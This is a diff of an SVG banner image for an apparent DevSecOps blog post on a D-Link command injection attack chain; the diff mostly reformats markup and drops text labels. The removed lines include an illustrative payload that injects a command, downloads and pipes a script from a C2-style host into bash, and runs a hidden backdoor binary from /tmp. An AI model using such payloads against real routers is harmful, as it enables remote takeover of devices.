@@ -1,90 +1,75 @@
+<?xml version="1.0" encoding="UTF-8"?>
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 630" width="1200" height="630">
   <title>dlink-command-injection-attack-chain</title>
   <defs>
     <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
-      <stop offset="0%" style="stop-color:#1a0a0a"/>
-      <stop offset="100%" style="stop-color:#2d1212"/>
+      <stop offset="0%" style="stop-color:#1a0a0a" />
+      <stop offset="100%" style="stop-color:#2d1212" />
     </linearGradient>
     <linearGradient id="accent" x1="0%" y1="0%" x2="100%" y2="0%">
-      <stop offset="0%" style="stop-color:#c0392b"/>
-      <stop offset="100%" style="stop-color:#d35400"/>
+      <stop offset="0%" style="stop-color:#c0392b" />
+      <stop offset="100%" style="stop-color:#d35400" />
     </linearGradient>
     <marker id="arrowhead" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
-      <path d="M 0 0 L 6 3 L 0 6 Z" fill="#d35400"/>
+      <path d="M 0 0 L 6 3 L 0 6 Z" fill="#d35400" />
     </marker>
   </defs>
-  <rect width="1200" height="630" fill="url(#bg)"/>
-  <line x1="0" y1="105" x2="1200" y2="105" stroke="rgba(255,255,255,0.04)" stroke-width="1"/>
-  <line x1="0" y1="210" x2="1200" y2="210" stroke="rgba(255,255,255,0.04)" stroke-width="1"/>
-  <line x1="0" y1="315" x2="1200" y2="315" stroke="rgba(255,255,255,0.04)" stroke-width="1"/>
-  <line x1="0" y1="420" x2="1200" y2="420" stroke="rgba(255,255,255,0.04)" stroke-width="1"/>
-  <line x1="240" y1="0" x2="240" y2="630" stroke="rgba(255,255,255,0.03)" stroke-width="1"/>
-  <line x1="480" y1="0" x2="480" y2="630" stroke="rgba(255,255,255,0.03)" stroke-width="1"/>
-  <line x1="720" y1="0" x2="720" y2="630" stroke="rgba(255,255,255,0.03)" stroke-width="1"/>
-  <line x1="960" y1="0" x2="960" y2="630" stroke="rgba(255,255,255,0.03)" stroke-width="1"/>
-  <circle cx="1050" cy="450" r="200" fill="rgba(255,255,255,0.02)"/>
-  <circle cx="1050" cy="450" r="140" fill="rgba(255,255,255,0.02)"/>
-  <!-- Router body -->
-  <rect x="810" y="140" width="110" height="65" rx="8" fill="rgba(192,57,43,0.15)" stroke="#c0392b" stroke-width="2"/>
-  <rect x="824" y="152" width="82" height="8" rx="2" fill="rgba(192,57,43,0.5)"/>
-  <rect x="824" y="165" width="60" height="6" rx="2" fill="rgba(192,57,43,0.3)"/>
-  <rect x="824" y="176" width="72" height="6" rx="2" fill="rgba(192,57,43,0.3)"/>
-  <circle cx="900" cy="185" r="5" fill="#c0392b" opacity="0.85"/>
-  <!-- Antenna lines -->
-  <line x1="835" y1="140" x2="835" y2="118" stroke="#c0392b" stroke-width="2" opacity="0.7"/>
-  <line x1="855" y1="140" x2="855" y2="112" stroke="#c0392b" stroke-width="2" opacity="0.7"/>
-  <line x1="875" y1="140" x2="875" y2="118" stroke="#c0392b" stroke-width="2" opacity="0.7"/>
-  <!-- Attack chain: 4 steps in a path -->
-  <!-- Step 1 -->
-  <rect x="760" y="255" width="108" height="36" rx="5" fill="rgba(192,57,43,0.15)" stroke="#c0392b" stroke-width="1.5"/>
-  <text x="814" y="272" font-size="10" fill="#ff8a80" font-family="monospace" text-anchor="middle">1. ATTACKER</text>
-  <text x="814" y="284" font-size="9" fill="rgba(255,255,255,0.5)" font-family="monospace" text-anchor="middle">crafts payload</text>
-  <!-- Arrow 1 -->
-  <line x1="868" y1="273" x2="896" y2="273" stroke="#d35400" stroke-width="2" marker-end="url(#arrowhead)"/>
-  <!-- Step 2 -->
-  <rect x="900" y="255" width="108" height="36" rx="5" fill="rgba(211,84,0,0.15)" stroke="#d35400" stroke-width="1.5"/>
-  <text x="954" y="272" font-size="10" fill="#ffab40" font-family="monospace" text-anchor="middle">2. INJECT CMD</text>
-  <text x="954" y="284" font-size="9" fill="rgba(255,255,255,0.5)" font-family="monospace" text-anchor="middle">via HTTP param</text>
-  <!-- Arrow 2 (down) -->
-  <line x1="954" y1="291" x2="954" y2="318" stroke="#d35400" stroke-width="2" marker-end="url(#arrowhead)"/>
-  <!-- Step 3 -->
-  <rect x="900" y="322" width="108" height="36" rx="5" fill="rgba(192,57,43,0.2)" stroke="#c0392b" stroke-width="1.5"/>
-  <text x="954" y="339" font-size="10" fill="#ff8a80" font-family="monospace" text-anchor="middle">3. RCE SHELL</text>
-  <text x="954" y="351" font-size="9" fill="rgba(255,255,255,0.5)" font-family="monospace" text-anchor="middle">root access</text>
-  <!-- Arrow 3 (left) -->
-  <line x1="900" y1="340" x2="872" y2="340" stroke="#c0392b" stroke-width="2" marker-end="url(#arrowhead)"/>
-  <!-- Step 4 -->
-  <rect x="760" y="322" width="108" height="36" rx="5" fill="rgba(192,57,43,0.15)" stroke="#c0392b" stroke-width="1.5"/>
-  <text x="814" y="339" font-size="10" fill="#ff8a80" font-family="monospace" text-anchor="middle">4. EXFILTRATE</text>
-  <text x="814" y="351" font-size="9" fill="rgba(255,255,255,0.5)" font-family="monospace" text-anchor="middle">data extraction</text>
-  <!-- Payload snippet box -->
-  <rect x="760" y="385" width="290" height="54" rx="4" fill="rgba(0,0,0,0.45)" stroke="rgba(192,57,43,0.3)" stroke-width="1"/>
-  <text x="775" y="403" font-size="9" fill="rgba(255,150,100,0.9)" font-family="monospace">// CVE-2024-XXXX D-Link RCE</text>
-  <text x="775" y="419" font-size="9" fill="rgba(255,100,100,0.9)" font-family="monospace">ping; wget http://c2.io/s.sh | bash</text>
-  <text x="775" y="433" font-size="9" fill="rgba(255,100,100,0.6)" font-family="monospace">chmod +x /tmp/.bd &amp;&amp; /tmp/.bd &amp;</text>
-  <!-- Left accent bar -->
-  <rect x="0" y="0" width="6" height="630" fill="url(#accent)"/>
-  <!-- Date badge -->
-  <rect x="80" y="60" width="240" height="32" rx="6" fill="rgba(192,57,43,0.25)" stroke="rgba(192,57,43,0.4)" stroke-width="1"/>
+  <rect width="1200" height="630" fill="url(#bg)" />
+  <line x1="0" y1="105" x2="1200" y2="105" stroke="rgba(255,255,255,0.04)" stroke-width="1" />
+  <line x1="0" y1="210" x2="1200" y2="210" stroke="rgba(255,255,255,0.04)" stroke-width="1" />
+  <line x1="0" y1="315" x2="1200" y2="315" stroke="rgba(255,255,255,0.04)" stroke-width="1" />
+  <line x1="0" y1="420" x2="1200" y2="420" stroke="rgba(255,255,255,0.04)" stroke-width="1" />
+  <line x1="240" y1="0" x2="240" y2="630" stroke="rgba(255,255,255,0.03)" stroke-width="1" />
+  <line x1="480" y1="0" x2="480" y2="630" stroke="rgba(255,255,255,0.03)" stroke-width="1" />
+  <line x1="720" y1="0" x2="720" y2="630" stroke="rgba(255,255,255,0.03)" stroke-width="1" />
+  <line x1="960" y1="0" x2="960" y2="630" stroke="rgba(255,255,255,0.03)" stroke-width="1" />
+  <circle cx="1050" cy="450" r="200" fill="rgba(255,255,255,0.02)" />
+  <circle cx="1050" cy="450" r="140" fill="rgba(255,255,255,0.02)" />
+  
+  <rect x="810" y="140" width="110" height="65" rx="8" fill="rgba(192,57,43,0.15)" stroke="#c0392b" stroke-width="2" />
+  <rect x="824" y="152" width="82" height="8" rx="2" fill="rgba(192,57,43,0.5)" />
+  <rect x="824" y="165" width="60" height="6" rx="2" fill="rgba(192,57,43,0.3)" />
+  <rect x="824" y="176" width="72" height="6" rx="2" fill="rgba(192,57,43,0.3)" />
+  <circle cx="900" cy="185" r="5" fill="#c0392b" opacity="0.85" />
+  
+  <line x1="835" y1="140" x2="835" y2="118" stroke="#c0392b" stroke-width="2" opacity="0.7" />
+  <line x1="855" y1="140" x2="855" y2="112" stroke="#c0392b" stroke-width="2" opacity="0.7" />
+  <line x1="875" y1="140" x2="875" y2="118" stroke="#c0392b" stroke-width="2" opacity="0.7" />
+  
+  
+  <rect x="760" y="255" width="108" height="36" rx="5" fill="rgba(192,57,43,0.15)" stroke="#c0392b" stroke-width="1.5" />
+  <line x1="868" y1="273" x2="896" y2="273" stroke="#d35400" stroke-width="2" marker-end="url(#arrowhead)" />
+  
+  <rect x="900" y="255" width="108" height="36" rx="5" fill="rgba(211,84,0,0.15)" stroke="#d35400" stroke-width="1.5" />
+  <line x1="954" y1="291" x2="954" y2="318" stroke="#d35400" stroke-width="2" marker-end="url(#arrowhead)" />
+  
+  <rect x="900" y="322" width="108" height="36" rx="5" fill="rgba(192,57,43,0.2)" stroke="#c0392b" stroke-width="1.5" />
+  <line x1="900" y1="340" x2="872" y2="340" stroke="#c0392b" stroke-width="2" marker-end="url(#arrowhead)" />
+  
+  <rect x="760" y="322" width="108" height="36" rx="5" fill="rgba(192,57,43,0.15)" stroke="#c0392b" stroke-width="1.5" />
+  <rect x="760" y="385" width="290" height="54" rx="4" fill="rgba(0,0,0,0.45)" stroke="rgba(192,57,43,0.3)" stroke-width="1" />
+  <rect x="0" y="0" width="6" height="630" fill="url(#accent)" />
+  
+  <rect x="80" y="60" width="240" height="32" rx="6" fill="rgba(192,57,43,0.25)" stroke="rgba(192,57,43,0.4)" stroke-width="1" />
   <text x="200" y="81" font-size="13" fill="rgba(255,255,255,0.85)" font-family="sans-serif" text-anchor="middle" letter-spacing="1">JANUARY 29, 2026</text>
-  <!-- Title -->
+  
   <text x="80" y="185" font-size="46" font-weight="700" fill="white" font-family="sans-serif">D-Link Command Injection</text>
   <text x="80" y="245" font-size="46" font-weight="700" fill="white" font-family="sans-serif">Attack Chain</text>
-  <!-- Subtitle -->
+  
   <text x="80" y="300" font-size="19" fill="rgba(255,255,255,0.65)" font-family="sans-serif">Step-by-step exploit chain from initial access to RCE on D-Link devices</text>
-  <!-- Accent line -->
-  <rect x="80" y="325" width="420" height="3" fill="url(#accent)" rx="2"/>
-  <!-- Category -->
+  
+  <rect x="80" y="325" width="420" height="3" fill="url(#accent)" rx="2" />
+  
   <text x="80" y="370" font-size="14" fill="rgba(255,255,255,0.5)" font-family="sans-serif" letter-spacing="2">VULNERABILITY ANALYSIS</text>
-  <!-- Pill tags -->
-  <rect x="80" y="402" width="90" height="36" rx="18" fill="rgba(192,57,43,0.25)" stroke="rgba(192,57,43,0.5)" stroke-width="1"/>
+  
+  <rect x="80" y="402" width="90" height="36" rx="18" fill="rgba(192,57,43,0.25)" stroke="rgba(192,57,43,0.5)" stroke-width="1" />
   <text x="125" y="425" font-size="13" fill="rgba(255,255,255,0.85)" font-family="sans-serif" text-anchor="middle">D-Link</text>
-  <rect x="186" y="402" width="130" height="36" rx="18" fill="rgba(211,84,0,0.2)" stroke="rgba(211,84,0,0.45)" stroke-width="1"/>
+  <rect x="186" y="402" width="130" height="36" rx="18" fill="rgba(211,84,0,0.2)" stroke="rgba(211,84,0,0.45)" stroke-width="1" />
   <text x="251" y="425" font-size="13" fill="rgba(255,255,255,0.85)" font-family="sans-serif" text-anchor="middle">Cmd Injection</text>
-  <rect x="332" y="402" width="120" height="36" rx="18" fill="rgba(192,57,43,0.2)" stroke="rgba(192,57,43,0.4)" stroke-width="1"/>
+  <rect x="332" y="402" width="120" height="36" rx="18" fill="rgba(192,57,43,0.2)" stroke="rgba(192,57,43,0.4)" stroke-width="1" />
   <text x="392" y="425" font-size="13" fill="rgba(255,255,255,0.85)" font-family="sans-serif" text-anchor="middle">Attack Chain</text>
-  <!-- Bottom bar -->
-  <rect x="0" y="520" width="1200" height="110" fill="rgba(0,0,0,0.3)"/>
+  
+  <rect x="0" y="520" width="1200" height="110" fill="rgba(0,0,0,0.3)" />
   <text x="80" y="545" font-size="15" fill="rgba(255,255,255,0.5)" font-family="sans-serif">tech.2twodragon.com</text>
   <text x="1120" y="545" font-size="13" fill="rgba(255,255,255,0.4)" font-family="sans-serif" text-anchor="end">DevSecOps</text>
 </svg>
